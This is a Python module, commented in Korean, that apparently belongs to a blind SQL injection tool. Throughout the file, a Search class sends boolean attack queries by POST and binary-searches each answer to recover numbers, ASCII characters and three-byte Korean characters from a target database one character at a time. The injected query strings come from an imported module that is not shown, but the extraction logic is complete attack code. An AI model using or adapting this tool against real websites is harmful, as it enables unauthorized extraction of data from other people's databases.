from attack_setting import attackData
from attack_query import attackQuerys

class Search:
    def binary_search(destination,attack_query):
        querys=attackQuerys()
        min,max = querys.min, querys.max
        test_url = querys.get_test_query(attack_query,value=0)
        if destination.send_post_request(test_url) != True:
            raise ValueError("0>= : 잘못된 쿼리입니다.",test_url)
        
        while (max > min):
            avg = (max+min)//2 
            attack_url = querys.get_complete_query(attack_query,value=avg)
            
            if destination.send_post_request(attack_url)==True: #여기에 쿼리 공격 넣음 
                min = avg+1
            else:
                max = avg
            #print('-',end="",flush=True)

        attack_url = querys.get_complete_query(attack_query,value=min)
        attack_url = attack_url.replace(">","=")
        if destination.send_post_request(attack_url)==True:
            return min
        else:
            attack_url = querys.get_complete_query(attack_query,value=querys.max)
            if destination.send_post_request(attack_url)==True:
                return querys.max
            else:
                raise ValueError("잘못된 쿼리입니다.")
            
    def korean_search(destination,attack_query,i):
        querys=attackQuerys()
        
        null_check_query = querys.get_equal_query(attack_query.format(i),value=0)
        if destination.send_post_request(null_check_query)==True:
            return 'null'
            

        min = int('EAB080', 16) #한글 첫글자
        max = int('ED9E93', 16) #한글 마지막 글자 

        while(max > min):
            avg = (min+max)//2
            attack_url = querys.get_complete_query(attack_query.format(i),value=avg)
            if destination.send_post_request(attack_url)==True:
                min = avg+1
            else:
                max = avg
            #print('-',end="",flush=True)


        attack_url = querys.get_complete_query(attack_query.format(i),value=min)
        attack_url = attack_url.replace(">","=")
        if destination.send_post_request(attack_url)==True:
            return Search.hex_to_korean(min)
            
        else:
            raise ValueError("잘못된 쿼리입니다.",attack_url)
        


        
    def ascii_search(destination,attack_query,i):
        querys=attackQuerys()

        min,max = 32,128
        while(max > min):
            avg = (min+max)//2
            attack_url = querys.get_complete_query(attack_query.format(i),value=avg)
            if destination.send_post_request(attack_url)==True:
                min = avg+1
            else:
                max = avg
            #print('-',end="",flush=True)
            

        attack_url = querys.get_complete_query(attack_query.format(i),value=min)
        attack_url = attack_url.replace(">","=")
        if destination.send_post_request(attack_url)==True:
            return chr(min)
            #print(f'\n{i}번째 글자 = {chr(min)}',end="",flush=True)
            
        else:
            raise ValueError("잘못된 쿼리입니다.",attack_url)
        
        


    def letter_search(destination, attack_query, length):
        querys = attackQuerys()
        result = ""
        count = 0
        i = 1  # 반복문에서 현재의 인덱스를 나타내는 변수입니다.

        while count < length:
            if destination.send_post_request(querys.get_complete_query(attack_query.format(i), value=128)):
                letter = Search.korean_search(destination, attack_query, i)
                count += 3  # 한글인 경우 count를 3 증가시킵니다.
            else:
                letter = Search.ascii_search(destination, attack_query, i)
                count += 1  # 영문인 경우 count를 1 증가시킵니다.

            result += letter
            print(letter, end="",flush=True)
            i += 1  # 인덱스를 증가시켜 다음 문자를 처리합니다.

        return result

        
    
    def hex_to_korean(decimal_number):
        try:
            # 10진수를 16진수로 변환
            hex_string = '{:X}'.format(decimal_number)
            # 16진수 문자열을 UTF-8로 디코딩하여 한글로 변환
            byte_data = bytes.fromhex(hex_string)
            korean_text = byte_data.decode('utf-8')
            return korean_text
        except UnicodeDecodeError:
            print("Error: Invalid hex input for Korean characters.")
            return None
        
        



    

